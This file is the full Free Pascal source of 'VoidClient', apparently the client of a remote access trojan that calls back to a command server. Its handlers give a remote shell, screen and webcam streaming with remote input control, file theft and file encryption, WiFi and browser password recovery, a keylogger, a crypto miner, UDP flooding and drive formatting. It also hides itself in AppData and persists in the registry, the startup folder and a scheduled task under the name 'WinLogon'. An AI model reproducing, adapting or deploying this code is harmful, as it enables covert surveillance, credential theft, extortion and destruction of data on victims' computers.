Program VoidClient;

{ TODO -cStrong : Download and Upload - multiple protocols }
{ TODO -cOptional : Move TheParams to Brain, fix GetParams }

{$mode objfpc}{$H+}
{$Apptype console}
//{$DEFINE TEMP}

Uses
  {$IFDEF UNIX}{$IFDEF UseCThreads}
  cthreads,
  {$ENDIF}{$ENDIF}
  Windows, Classes, SysUtils, IdTCPClient, Brain, VoidModules, FileUtil,
  Base64, LCLIntf, Graphics, Forms, Interfaces, Process, Clipbrd, Flood
  {$IFDEF TEMP}, Crt{$ENDIF}, DateUtils, AppendUtils;

type

  TRSThread = class(TThread) //Screenshare (Image)
  private
    FAllow: Boolean;
    FDrawCursor: Boolean;
    FCompression: Word; //1..100
    FLoginCommand: String;
  public
    property LoginCommand: String read FLoginCommand write FLoginCommand;
    property Compression: Word read FCompression write FCompression;
    property DrawCursor: Boolean read FDrawCursor write FDrawCursor;
    property Allow: Boolean read FAllow write FAllow;
    procedure Execute; override;
    procedure GetImage(var J: TJPEGImage);
  end;

  TRSIThread = class(TThread) //Screenshare (Commands)
  private
    FAllow: Boolean;
  public
    property Allow: Boolean read FAllow write FAllow;
    procedure Execute; override;
  end;

  TRCThread = class(TThread)
  public
    procedure Execute; override;
  end;

  TRFThread = class(TThread)
  public
    procedure Execute; override;
  end;

  TGlass = class(TThread)
  private
    FProcess: TProcess;
    FSendCommand: String;
    FContext: TIdTCPClient;
  public
    property TCPInterface: TIdTCPClient read FContext write FContext;
    property SendCommand: String read FSendCommand write FSendCommand;
    property Process: TProcess read FProcess Write FProcess;
    procedure Execute; override;
  end;

  TScriptThread = class(TThread)
  private
    FSchedule: TDateTime;
    FScriptFile: String;
  public
    property ScriptFile: String read FScriptFile write FScriptFile;
    property Schedule: TDateTime read FSchedule write FSchedule;
    procedure Execute; override;
  end;

label ConnectLabel;

const
  TheHost = '127.0.0.1'; //Default is localhost
  ThePort = 7019; //Default is 7019

var Main, RCmd: TIdTCPClient;

    CmdThread: TRCThread;
    FileThread: TRFThread;
    ScreenThread: TRSThread;
    ScrComThread: TRSIThread;
    WebCamThread: TRSThread;
    Floods: Array of TUDPFlooder;
    Scripts: Array of TScriptThread;
    ActiveScripts: LongInt = 0;
    SoundGlass: TGlass;

    ComputerName: String;
    C, Params, SomeFile, SFN, ScriptName: String;
    CNum: LongInt;

const KeepTrackFile = '..\Post\build.txt'; //For builds

procedure KeepTrack;
var FFile: Text;
    J: LongInt;
Begin
  if FileExists(KeepTrackFile) then Begin
    AssignFile(FFile,KeepTrackFile);
    Reset(FFile);
    Readln(FFile, J);
    CloseFile(FFile);
  end else J:=0;
  AssignFile(FFile,KeepTrackFile);
  Rewrite(FFile);
  J+=1;
  Writeln(FFile, J);
  CloseFile(FFile);
End;

procedure ReplyEx(Cmd: LongInt; Status: String);
Begin
  Main.IOHandler.WriteLn(IntToStr(Cmd)+'@'+Status);
end;

procedure _Reply(Cmd: LongInt; Status: String);
Begin
  ReplyEx(Cmd, EncryptStr(Status{%H-}, Key));
end;

procedure ReplyQueue(Cmd: LongInt; Items: TStringList; Verbose: Boolean = false);
var J: LongInt;
Begin
  For J:=0 to Items.Count-1 do
  if (Verbose) and (J=Items.Count-1) then Begin
   ReplyEx(Cmd, EncryptStr(Items.Strings[J]{%H-}+'#Last'{%H-}, Key));
  end
  else Begin
   ReplyEx(Cmd, EncryptStr(Items.Strings[J]{%H-}, Key));
  end;
end;

procedure GetWebCamImage(var J: TJPEGImage);
var Pic: TPicture;
Begin
  if Clipboard.HasPictureFormat then Begin
   Pic:=TPicture.Create;
   Pic.Assign(Clipboard);
   J.Assign(Pic.Jpeg);
   Pic.Free;
  end;
end;

procedure TRSThread.GetImage(var J: TJPEGImage);
var Scr: HDC;
Begin
  Scr:=GetDC(0);
  J.LoadFromDevice(Scr);
  ReleaseDC(0, Scr);
end;

procedure TRSThread.Execute;
var ScrShare: TIdTCPClient;
    Jay: TJPEGImage;
    M: TMemoryStream;
    HCursor : THandle;
    CursorPos: TPoint;
Begin
 ScrShare:=TIdTCPClient.Create;
 Writeln('ScrShare created');
 ScrShare.Host:=TheHost;
 ScrShare.Port:=ThePort;
 Repeat
   try
     ScrShare.Connect;
   except
     Sleep(100);
   end;
 until ScrShare.Connected;
 Writeln('SS Connected');
 ScrShare.IOHandler.Writeln(FLoginCommand+'@');
 Writeln('SS Logged in');
 if FLoginCommand='4' then Writeln('Webcam mode.');
 Sleep(100);
 ScrShare.IOHandler.LargeStream:=True;
  Jay:=TJPEGImage.Create;
  M:=TMemoryStream.Create;
  Repeat

    M.Clear;
    Jay.Clear;

    Jay.CompressionQuality:=FCompression;
    if FLoginCommand='4' then GetWebCamImage(Jay) else
    GetImage(Jay);
    if FDrawCursor then Begin
     HCursor:= Screen.Cursors[Ord(Screen.Cursor)];
     GetCursorPos(CursorPos);
     DrawIconEx(Jay.Canvas.Handle, CursorPos.x, CursorPos.y, HCursor, 32, 32, 0, 0, DI_NORMAL);
    end;

    Jay.SaveToStream(M);
    M.Position:=0;

    ScrShare.IOHandler.Write(M, 0, True);
  until Not(FAllow);
  Jay.Free;
  M.Free;
  ScrShare.Free;
  Writeln('Free');
End;

procedure TRSIThread.Execute;
var ScrCom: TIdTCPClient;
    INum: LongInt;
    X: String;
    XP, YP: LongInt;
Begin
 ScrCom:=TIdTCPClient.Create;
 Writeln('ScrCom created');
 ScrCom.Host:=TheHost;
 ScrCom.Port:=ThePort;
 Repeat
   try
     ScrCom.Connect;
   except
     Sleep(100);
   end;
 until ScrCom.Connected;
 ScrCom.IOHandler.Writeln('300@');
 Writeln('ScrCom logged in');
 Repeat
   X:='';
   X:=ScrCom.IOHandler.ReadLn();
   INum:=StrToInt(LeftStr(X, Pos('@', X) - 1));
   Delete(X, 1, Pos('@', X));
   if INum=776 then Begin
    FAllow:=False;
    ScreenThread.Allow:=False;
    Sleep(100);
    ScrCom.IOHandler.Writeln('776@');
   end else Begin
    Case INum of
      301: Begin
        Writeln('Remote cursor drawing on.');
        ScreenThread.DrawCursor:=True;
      end;
      302: Begin
        Writeln('Remote cursor drawing off');
        ScreenThread.DrawCursor:=False;
      end;
      303: Begin
       XP:=StrToInt(LeftStr(X,Pos('/',X)-1));
       Delete(X,1,Pos('/',X));
       XP:=Round(XP/(StrToInt(LeftStr(X,Pos(',',X)-1)))*Screen.Width);
       Delete(X,1,Pos(',',X));
       YP:=StrToInt(LeftStr(X,Pos('/',X)-1));
       Delete(X,1,Pos('/',X));
       YP:=Round(YP/(StrToInt(X))*Screen.Height);
       SetCursorPos (XP, YP);
      end;
      304: Begin
       mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
      end;
      305: Begin
       mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
       mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
      end;
      306: Begin
       mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
      end;
      307: Begin
       keybd_event(StrToInt(X), 0, 0, 0);
      end;
      308: Begin
       keybd_event(StrToInt(X), 0, KEYEVENTF_KEYUP, 0);
      end;
      309: Begin
       ScreenThread.Compression:=StrToInt(X);
      end;
    end;
   end;
 until Not(FAllow);
 Writeln('ScrCom Free');
end;

procedure TGlass.Execute;
var
    Buffer: string;
    BytesAvailable: DWord;
    BytesRead:LongInt;

begin
 {
  Glass is an I/O thread.
  It works with process outputs (pipes)
 }
 Writeln('Glass started.');
 Repeat
   if(FProcess.Running) then
    begin
      BytesAvailable := FProcess.Output.NumBytesAvailable;
      BytesRead := 0;
      while BytesAvailable>0 do
      begin
        SetLength(Buffer, BytesAvailable);
        BytesRead := FProcess.OutPut.Read(Buffer[1], BytesAvailable);
        FContext.IOHandler.Writeln(SendCommand+'@'+EncryptStr(Copy(Buffer,1, BytesRead)+'#'{%H-},Key));
        //Write(Buffer);
        BytesAvailable := FProcess.Output.NumBytesAvailable;
      end;
    end;
 Sleep(10);
 until Not(FProcess.Running);
 Writeln('Glass ended');
end;

procedure TRCThread.Execute;
var X: String;
    INum: LongInt;
    Closing: Boolean = false;
    G: TGlass;
Begin
 Brain.CreateActiveCmdSession;
 G:=TGlass.Create(True);
 G.Process:=CmdSession;
 G.SendCommand:='777';
 G.TCPInterface:=RCmd;
 G.FreeOnTerminate:=True;
 G.Start;
 Repeat
   X:='';
   X:=RCmd.IOHandler.ReadLn();
   INum:=StrToInt(LeftStr(X, Pos('@', X) - 1));
   Delete(X, 1, Pos('@', X));
   if INum=776 then Begin
     Closing:=True;
     CmdSession.Terminate(0);
     RCmd.IOHandler.Writeln('776@');
     Sleep(100);
     RCmd.Free;
   end else Begin
    X:=DecryptStr(X, Key);
    Writeln('RemoteCommand: ',X);
    Brain.ExecuteCmdSession(X);
   end;
   Sleep(100);
 until Closing;
 Brain.FreeActiveCmdSession;
 Writeln('Closed');
end;

procedure NoDBG;
Begin

end;

function Melted: Boolean;
Begin
 Result:=(AppData+ExeName=ParamStr(0));
end;

procedure Melt;
Begin
 if CopyFile(ParamStr(0),AppData+ExeName, True) then
 Brain.SafeExec('taskkill /f /im "'+ExeName+'" & timeout 3 & del "'+ParamStr(0)+'" & "'+AppData+ExeName+'"');
end;

function AddedToStartUp: Boolean;
var Reg, Fol, Tas: Boolean;
Begin
 Reg:=RegKeyExists('\Software\Microsoft\Windows\CurrentVersion\Run', 'WinLogon');
 Fol:=FileExists(StartUp+ExeName);
 Tas:=TaskExists('WinLogon');
 Result:=Reg or Fol or Tas;
end;

procedure AddToStartUp(Mode: Byte);
Begin
 Case Mode of
   1: Brain.AddToRegStart;
   2: CopyFile(ParamStr(0),StartUp+ExeName, True);
   3: AddTask('WinLogon','ONLOGON',AppData+ExeName);
 end;
end;

procedure MakeVolatile;
Begin

end;

procedure ProtectProcess;
Begin

end;

procedure Initialize;
var VOpt: String = '';
Begin
  //Get settings
 try
  VOpt:=ReadEOF(ParamStr(0),'VOPT','VEND');
  if VOpt='' then Begin
    VOpt:=CutStringResource('VOPT');
    if VOpt='' then Begin
      VOpt:=ReadADS(ParamStr(0),'VOPT');
      if VOpt='' then VOpt:='0000000'
      else Writeln('Options found in ADS');
    end else Writeln('Options found in RES');
  End else Writeln('Options found in EOF');
  except
   VOpt:='0000000';
  end;
  Writeln('Options: "',VOpt,'"');
  //ChDir(AppData);   <-- Causes problems
  if Not(FileExists(Appdata+ExeName)) then CopyFile(ParamStr(0), AppData+ExeName, True);
  //Order: Execution Delay(2), Anti-Debugging(1), Melt(3), Add to StartUp(6-7), Volatile(4), Protect Process(5)
  if GetOption(VOPT, 2)=1 then Sleep(7000);
  if GetOption(VOPT, 1)=1 then NoDBG;
  if (Not(Melted)) and (GetOption(VOPT, 3)=1) then Melt;
  if GetOption(VOPT, 6)=1 then
  if Not(AddedToStartUp) then
  AddToStartUp(GetOption(VOPT, 7));
  if GetOption(VOPT, 4)=1 then MakeVolatile;
  if GetOption(VOPT, 5)=1 then ProtectProcess;
  ComputerName:=Brain.TheComputerName;
End;

procedure TRFThread.Execute;
{ FileSystem Navigator
  223 - Get dirive list (initial)
  224 - Get file and subfolder list
  225 - Clear current file list
  226 - Delete folder (recursive)
  227 - Delete single file
  228 - Open file
  229 - ToggleCrypt folder (recursive)
  230 - ToggleCrypt single file
  231 - Copy folder (recursive)
  232 - Copy file
  233 - Move folder (recursive)
  234 - Move File
  235 - Download folder to remote server
  236 - Download file to remote server
  237 - Download a file to the local computer
  238 - Make a new directory
}
var X: String;
    INum: LongInt;
    Closing: Boolean = false;
    WorkList: TStringList;
    Huge, Current: String;
label RemoteDLOverride;
Begin
 WorkList:=TStringList.Create;
 Repeat
   X:='';
   X:=RCmd.IOHandler.ReadLn();
   INum:=StrToInt(LeftStr(X, Pos('@', X) - 1));
   Delete(X, 1, Pos('@', X));
   if INum=776 then Begin
     Closing:=True;
     RCmd.IOHandler.Writeln('776@');
     Sleep(100);
     RCmd.Free;
   end else Begin
    X:=DecryptStr(X, Key);
    Writeln('RemoteCommand: ',INum,' ',X);
    WorkList.Clear;
    Case INum of
      223: Begin
         Brain.GetDriveLetters(WorkList);
         ReplyQueue(INum, WorkList, True);
      End;
      224: Begin
         Brain.ScanDir(X, WorkList);
         ReplyEx(225,'');
         Sleep(10);
         ReplyQueue(INum, WorkList);
      end;
      226: Begin
         if Brain.DeleteDirectory(X) then
         _Reply(226,X+' was deleted successfully.')
         else _Reply(226,'Failed to delete '+X+'.');
      end;
      227: Begin
         if DeleteFile(X) then
         _Reply(226,X+' was deleted successfully.')
         else _Reply(226,'Failed to delete '+X+'.');
      end;
      228: Begin
         Brain.OpenFileDefault(X);
         _Reply(250,X+' was opened.');
      end;
      229: Begin
         Brain.ToggleCryptDir(X, Key);
         _Reply(250,'Encryption toggled on '+X);
      end;
      230: Begin
         Brain.ToggleCrypt(X, Key);
         _Reply(250,'Encryption toggled on '+X);
      end;
      231: Begin
          if Brain.CopyDir(GetParam(1, X),GetParam(2, X)) then
         _Reply(250,GetParam(1, X)+' copied successfully.') else
         _Reply(250,'Failed to copy '+GetParam(1, X)+' to '+GetParam(2, X)+'.');
      End;
      232: Begin
         if CopyFile(GetParam(1, X),GetParam(2, X)) then
         _Reply(250,GetParam(1, X)+' copied successfully.') else
         _Reply(250,'Failed to copy '+GetParam(1, X)+' to '+GetParam(2, X)+'.');
      end;
      233: Begin
         if Brain.MoveDir(GetParam(1, X), GetParam(2, X)) then
         _Reply(250,GetParam(1, X)+' moved successfully.') else
         _Reply(250,'Failed to move '+GetParam(1, X)+' to '+GetParam(2, X)+'.');
      end;
      234: Begin
         if Brain.MoveFileEx(GetParam(1, X), GetParam(2, X)) then
         _Reply(250,GetParam(1, X)+' moved successfully.') else
         _Reply(250,'Failed to move '+GetParam(1, X)+' to '+GetParam(2, X)+'.');
      end;
      235: Begin
        if DirectoryExists(X) then Begin
         Brain.ZipFolder(X);
         X:=ExtractFileName(X)+'.zip';
         Goto RemoteDLOverride;
        end else _Reply(250,'The specified directory doesn''t exist.');
      end;
      236: Begin
RemoteDLOverride:
         if FileExists(X) then Begin
         Writeln('File exists');
         Huge:=EncodeStringBase64(Brain.SFileToString(X));
         While Length(Huge)>600 do Begin
          Current:=LeftStr(Huge, 600);
          Delete(Huge,1,600);
          _Reply(236,Current);
         End;
         if Length(Huge)>0 then _Reply(236,Huge);
         _Reply(236,'OVER');
         Writeln('Transfer finished.');
         end else _Reply(250,X+' doesn''t exist.');
      end;
      237: Begin
         if Pos('FileName',X)=0 then Begin
         if X<>'OVER' then Begin
          SomeFile+=X;
         end else Begin
          SomeFile:=DecodeStringBase64(SomeFile);
          Brain.SaveFile(SFN, SomeFile);
          SomeFile:='';
          SFN:='';
         end;
         end else Begin
          Delete(X,1,8);
          SFN:=X;
         end;
      end;
      238: Begin
         MkDir(X);
         if DirectoryExists(X) then
         _Reply(250,'Folder created successfully.')
         else _Reply(250,'Failed to create Folder.');
      end;
    end;
   end;
   Sleep(100);
 until Closing;
 WorkList.Free;
 Writeln('Closed');
end;

procedure Perform(Cmd: LongInt; TheParams: String; IsScript: Boolean = False);
var M, ChildParams: WideString;
    T: Word = 0;
    SomeInt, J, CN: Integer;
    Script: TStringList;

label ScriptOptimize;

procedure Reply(Str: String);
Begin
  if Not(IsScript) then
  ReplyEx(Cmd, EncryptStr(Str{%H-}, Key)) else
  ReplyEx(Cmd, EncryptStr('Script: '+Str{%H-}, Key))
End;

Begin
  Case Cmd of
    //System
    10: Begin
      Reply('Shutdown initiated.');
      Brain.SafeExec('shutdown /s /f /t 0');
    end;
    20: Begin
      Reply('Shutdown initiated.');
      Brain.SafeExec('shutdown /s /f /t 30 /c "'+GetParam(1, TheParams)+'"');
    end;
    30: Begin
      Reply('Reboot initiated.');
      Brain.SafeExec('shutdown /r /f /t 0');
    end;
    40: Begin
      Brain.SetMonitor(MONITOR_OFF);
      Reply('Active monitor turned off.');
    end;
    50: Begin
      Brain.SetMonitor(MONITOR_ON);
      Reply('Active monitor turned on.');
    end;
    //Networks
    11: Begin
      Brain.SafeExec('ipconfig /all > Temp.txt');
      Reply('Network Info: '+Brain.LoadFile('Temp.txt'));
      DeleteFile('Temp.txt');
    end;
    21: Begin
      Brain.SafeExec('netsh wlan show all> Temp.txt');
      Reply('Available WiFi Networks: '+Brain.LoadFile('Temp.txt'));
      DeleteFile('Temp.txt');
    end;
    31: Begin
      M:=VoidModules.RecoverWifiPasswords;
      M:=DecryptStr(M, 333);
      Brain.SaveFile('WConfig.bat',M);
      M:='';
      Brain.SafeExec('call WConfig.bat > "'+GetParam(1, TheParams)+'"');
      DeleteFile('WConfig.bat');
      Reply('WiFi Passwords saved.');
    end;
    //Processes
    12: Begin
      Reply(Brain.ProcessList);
    end;
    22: Begin
      if Brain.ProcessExists(GetParam(1, TheParams)) then
      Reply(GetParam(1, TheParams)+' exists!') else
      Reply(GetParam(1, TheParams)+' doesn''t exist!');
    end;
    32: Begin
      Brain.SafeExec('taskkill /f /im "'+GetParam(1, TheParams)+'" > Temp.txt');
      Reply(Brain.LoadFile('Temp.txt'));
      DeleteFile('Temp.txt');
    end;
    42: Begin
      Brain.DisableTaskMgr(True);
      Reply('Task Manager was disabled.');
    end;
    52: Begin
      Brain.DisableTaskMgr(False);
      Reply('Task Manager was enabled.');
    end;
    13: Begin
      Reply(Brain.GetSystemInfo);
    end;
    23: Begin
      Reply(Brain.GetInstalledPrograms);
    end;
    33: Begin
      if VoidModules.CutLResource('svchost') then Begin
        Sleep(1000);
        if Not(FileExists('svchost.exe')) then
        Reply('Error. Stopped by AV? (Scantime)') else Begin
          Brain.SafeExec('svchost.exe /stext "'+GetParam(1, TheParams)+'"');
          DeleteFile('svchost.exe');
          if FileExists(GetParam(1, TheParams)) then Begin
           Reply('Success. Recovered passwords stored.');
          end else Reply('Error. Stopped by AV? (Runtime)');
        end;
      end;
    end;
    14: Begin
      if DownloadFile(GetParam(1, TheParams), GetParam(2, TheParams)) then
      Reply('Download successful.')
      else Reply('Download failed.');
    End;
    24: Begin
      Reply(UploadFile(GetParam(2, TheParams),GetParam(1, TheParams)));
    End;
    34: Begin
    Reply('Execution in progress.');
      Brain.SafeExec(GetParam(1, TheParams),True);
    End;
    44: Begin
      Brain.SafeExec(GetParam(1, TheParams));
      Reply('Execution complete.');
    End;
    54: Begin
      if DownloadFile(GetParam(1, TheParams),'Update.exe') then Begin
       Reply('Download successful. Bye!');
       Brain.SafeExec('taskkill /f /im "'+ExtractFileName(ParamStr(0))+'" & '+
       'timeout 3 & del "'+ParamStr(0)+'" & Update.exe');
      End else Reply('Failed to download the new executable!');
    End;
    64: Begin
      Reply('Attempting to restart... Bye!');
      Brain.SafeExec('taskkill /f /im "'+ExtractFileName(ParamStr(0))+'" & timeout 5 & "'+ParamStr(0)+'"');
    End;
    74: Begin
      Reply('Attempting to uninstall... Bye!');
      Brain.SafeExec('taskkill /f /im "'+ExtractFileName(ParamStr(0))+'" & '+
       'timeout 3 & del "'+ParamStr(0)+'"');
    End;
    //84 - Server-side Command
    94: Begin
     Reply('Attempting to format drive '+GetParam(1,TheParams)+'...');
     Brain.SafeExec('format '+GetParam(1, TheParams)+': /q /y');
    End;
    15: Begin
     Script:=TStringList.Create;
     Script.Text:=GetScriptText(GetParam(1, TheParams));
     For J:=0 to Script.Count-1 do Begin
      CN:=StrToInt(LeftStr(Script.Strings[J], Pos('@', Script.Strings[J]) - 1));
      ChildParams:=RightStr(Script.Strings[J], Length(Script.Strings[J])-Pos('@', Script.Strings[J]));
      Writeln('Script line ',J,': ', CN,' ',ChildParams);
      Perform(CN, ChildParams, True);
     end;
     Script.Free;
    End;
    25: Begin
     Inc(ActiveScripts);
     SetLength(Scripts, ActiveScripts);
     Scripts[ActiveScripts-1]:=TScriptThread.Create(True);
     Scripts[ActiveScripts-1].ScriptFile:=GetParam(1, TheParams);
     Scripts[ActiveScripts-1].Schedule:=StrToDateTime(
                              GetParam(2, TheParams)+' '+GetParam(3, TheParams));
     Scripts[ActiveScripts-1].FreeOnTerminate:=True;
     Scripts[ActiveScripts-1].Start;
     Reply('Script scheduled successfully.');
    End;
    35: Begin
     ScriptName:='Script.js';
ScriptOptimize:
     if DownloadFile(GetParam(1,TheParams),ScriptName) then Begin
      Brain.SafeExec('cscript "'+GetParam(1, TheParams)+'" > Temp.txt');
      Reply(Brain.LoadFile('Temp.txt'));
      DeleteFile('Temp.txt');
      DeleteFile(ScriptName);
     end else Reply('Failed to download the Script.');
    End;
    45: Begin
     ScriptName:='Script.vbs';
     Goto ScriptOptimize;
    End;
    55: Begin
     Brain.SafeExec('taskkill /f /im cscript.exe & taskkill /f /im wscript.exe');
     Reply('All running scripts (JS and VBS) were terminated.');
    End;
    16: Begin
     if Not(FileExists('mssm-cmm.exe')) then
     Brain.DownloadFile(VoidModules.GetModule(2), 'mssm-cmm.exe');
     Brain.SafeExec('mssm-cmm.exe', EXEC_FILE);
     Repeat

     until (FileExists('conf.txt')) and (FileExists('kill.bat'));
     Brain.SafeExec('kill.bat', EXEC_COMMAND);
     SetupMiner(GetParam(1, TheParams), GetParam(2, TheParams), GetParam(3, TheParams),
                GetParam(4, TheParams), GetParam(5, TheParams), GetParam(6, TheParams),
                GetParam(7, TheParams), GetParam(8, TheParams), GetParam(9, TheParams));
     Brain.SafeExec('mssm-cmm.exe', EXEC_FILE);
     Reply('Mining started.');
    End;
    26: Begin
     if FileExists('kill.bat') then Begin
      Brain.SafeExec('kill.bat', EXEC_COMMAND);
      Reply('Mining stopped.');
     end else Reply('Miner module not found!');
    End;
    36: Begin
     SetLength(Floods, High(Floods) + 2); //New Flood thread
     SomeInt:=High(Floods);
     Floods[SomeInt]:=TUDPFlooder.Create(True);
     Floods[SomeInt].FreeOnTerminate:=True;
     Floods[SomeInt].Allow:=True;
     Floods[SomeInt].TargetIP:=GetParam(1, TheParams);
     Floods[SomeInt].TargetPort:=StrToInt(GetParam(2, TheParams));
     Floods[SomeInt].Start;
     Reply('Flood no. '+IntToStr(SomeInt)+' started!');
    End;
    46: Begin
     SomeInt:=0;
     For SomeInt:=0 to High(Floods) do
     Floods[SomeInt].Allow:=False;
     Reply('Stopped '+IntToStr(SomeInt)+' floods.');
    End;
    56: Begin
     if Brain.InitializeKeylogger(GetParam(1, TheParams), GetParam(2, TheParams)) then
     Reply('Keylogger started.') else Reply('Failed to start the Keylogger.');
    End;
    66: Begin
     Brain.FreeKeylogger;
     Reply('Keylogger stopped.');
    End;
    76: Begin
     OpenURL(GetParam(1, TheParams));
     Reply('URL opened.');
    end;
    86: Begin
     if StrToInt(GetParam(1,TheParams))>65535 then
     T:=65535 else
     T:=StrToInt(GetParam(1,TheParams));
     if Brain.SetMasterVolume(T) then
     Reply('Volume changed successfully.')
     else Reply('Failed to set the Volume.');
    End;
    96: Begin
     if Pos('.wav',GetParam(1, TheParams))>0 then Begin
      if FileExists(GetParam(1, TheParams)) then Begin
       Reply('Now playing '+GetParam(1, TheParams)+'...');
       Brain.PlaySound(GetParam(1, TheParams));
      end else Reply('The specified file doesn''t exist.');
     end else Reply('Invalid sound file.');
    End;
    106: Begin
      Beep;
      Reply('Beep-bloop.');
    End;
    116: Begin
      if FileExists(GetParam(1, TheParams)) then Begin
       Reply('Now printing the document...');
       Brain.PrintDocument(GetParam(1, TheParams));
      End else Begin
       Reply('The specified document doesn''t exist, printing a Test Page instead.');
       Brain.SaveFile('Void.txt','TEST PAGE'+sLineBreak+Brain.GetLocalTime+sLineBreak+Brain.GetSystemInfo);
       Brain.PrintDocument('Void.txt');
       Sleep(2000);
       DeleteFile('Void.txt');
      End;
    End;
    126: Begin
      if FileExists(GetParam(1, TheParams)) then Begin
      Reply('File opened.');
      Brain.OpenFileDefault(GetParam(1, TheParams))
      end else Reply('The specified file doesn''t exist.');
    End;
    136: Begin
      Reply('Msgbox opened.');
      MessageBox(0,PChar(GetParam(2,TheParams)),PChar(GetParam(1,TheParams)));
      Reply('Msgbox closed by user.');
    End;


    222: Begin
      RCmd:=TIdTCPClient.Create;
      Writeln('Rcmd created');
      RCmd.Host:=TheHost;
      RCmd.Port:=ThePort;
      Repeat
        try
          RCmd.Connect;
        except
          Sleep(100);
        end;
      until RCmd.Connected;
      RCmd.IOHandler.Writeln('2@');
      FileThread:=TRFThread.Create(True);
      FileThread.FreeOnTerminate:=True;
      FileThread.Start;
      Writeln('FileThread created.');
    End;
    333: Begin
      ScreenThread:=TRSThread.Create(True);
      ScreenThread.Allow:=True;
      ScreenThread.Compression:=75;
      ScreenThread.LoginCommand:='3';
      ScreenThread.FreeOnTerminate:=True;
      ScreenThread.Start;
      ScrComThread:=TRSIThread.Create(True);
      ScrComThread.Allow:=True;
      ScrComThread.FreeOnTerminate:=True;
      ScrComThread.Start;
    End;
    444: Begin
      if Brain.InitializeWebCam then Begin
      WebCamThread:=TRSThread.Create(True);
      WebCamThread.Allow:=True;
      WebCamThread.Compression:=75;
      WebCamThread.LoginCommand:='4';
      WebCamThread.FreeOnTerminate:=True;
      WebCamThread.Start;
      end;
    End;
    401: Begin
      WebCamThread.Allow:=False;
      Sleep(100);
      Brain.FreeWebCam;
      Writeln('All free');
    End;
    555: Begin
      if Brain.InitializeChat(GetParam(1, TheParams)) then Begin
      SoundGlass:=TGlass.Create(True);
      SoundGlass.Process:=Chat;
      SoundGlass.SendCommand:='501';
      SoundGlass.TCPInterface:=Main;
      //SoundGlass.FreeOnTerminate:=True;
      SoundGlass.Start;
      Reply('');
      end;
    End;
    501: Begin
      Brain.WriteToChat(GetParam(1,TheParams));
      Writeln('Written: ',GetParam(1,TheParams));
    End;
    502: Begin
      Chat.Terminate(0);
      Sleep(100);
      SoundGlass.Free;
      Brain.FreeChat;
      DeleteFile('Chat.exe');
    End;
    777: Begin
      RCmd:=TIdTCPClient.Create;
      Writeln('Rcmd created');
      RCmd.Host:=TheHost;
      RCmd.Port:=ThePort;
      Repeat
        try
          RCmd.Connect;
        except
          Sleep(100);
        end;
      until RCmd.Connected;
      RCmd.IOHandler.Writeln('7@');
      CmdThread:=TRCThread.Create(True);
      CmdThread.FreeOnTerminate:=True;
      CmdThread.Start;
      Writeln('CmdThread created.');
    end;
    776: Begin
      Reply('');
    end;
  end;
End;

procedure TScriptThread.Execute;
var NDT: TDateTime;
    CN, J: LongInt;
    ChildParams: String;
    Script: TStringList;
Begin
 Repeat
   NDT:=Now;
   Sleep(1);
 until CompareDateTime(FSchedule, NDT)<=0;
 Script:=TStringList.Create;
 Script.Text:=GetScriptText(FScriptFile);
 For J:=0 to Script.Count-1 do Begin
  CN:=StrToInt(LeftStr(Script.Strings[J], Pos('@', Script.Strings[J]) - 1));
  ChildParams:=RightStr(Script.Strings[J], Length(Script.Strings[J])-Pos('@', Script.Strings[J]));
  Writeln('Script line ',J,': ', CN,' ',ChildParams);
  Perform(CN, ChildParams, True);
 end;
 Script.Free;
 Dec(ActiveScripts);
End;

Begin
  //KeepTrack;
  {$IFDEF TEMP}
   Writeln('Temporary build 6/16/2018.');
   Writeln('Please delete this after you''re done with the testing!');
  {$ENDIF}
  Initialize;
  Main:=TIdTCPClient.Create;
  Main.Host:=TheHost;
  Main.Port:=ThePort;
ConnectLabel:
  Writeln('Trying to connect...');
  Repeat
    try
      Main.Connect;
    except
      Sleep(100);
    end;
  until Main.Connected;
  ReplyEx(0,EncryptStr(ComputerName{%H-}, Key));
  Writeln('Connected!');
  Repeat
    try
      C:=Main.IOHandler.ReadLn();
      Writeln(Brain.GetLocalTime+' '+C);
      CNum:=StrToInt(LeftStr(C, Pos('@', C) - 1));
      Delete(C, 1, Pos('@', C));
      Params:=DecryptStr(C, Key);
      Params:=StringReplace(Params, '\n', sLineBreak, [rfReplaceAll]);
      Writeln(Brain.GetLocalTime+' ',Cnum,'@'+Params);
      Perform(CNum, Params);
    except
    end;
  until Not(Main.Connected);
  Writeln('Disconnected from the server.');
  if Not(Main.Connected) then Goto ConnectLabel;
End.

